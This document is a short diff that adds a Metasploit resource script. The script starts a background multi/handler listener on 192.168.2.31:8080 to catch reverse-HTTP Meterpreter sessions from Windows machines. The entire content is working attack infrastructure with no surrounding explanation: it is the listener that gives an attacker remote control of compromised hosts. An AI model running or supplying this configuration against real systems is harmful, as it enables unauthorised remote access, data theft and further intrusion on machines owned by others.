@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 192.168.2.31
+set LPORT 8080
+set ExitOnSession false
+exploit -j
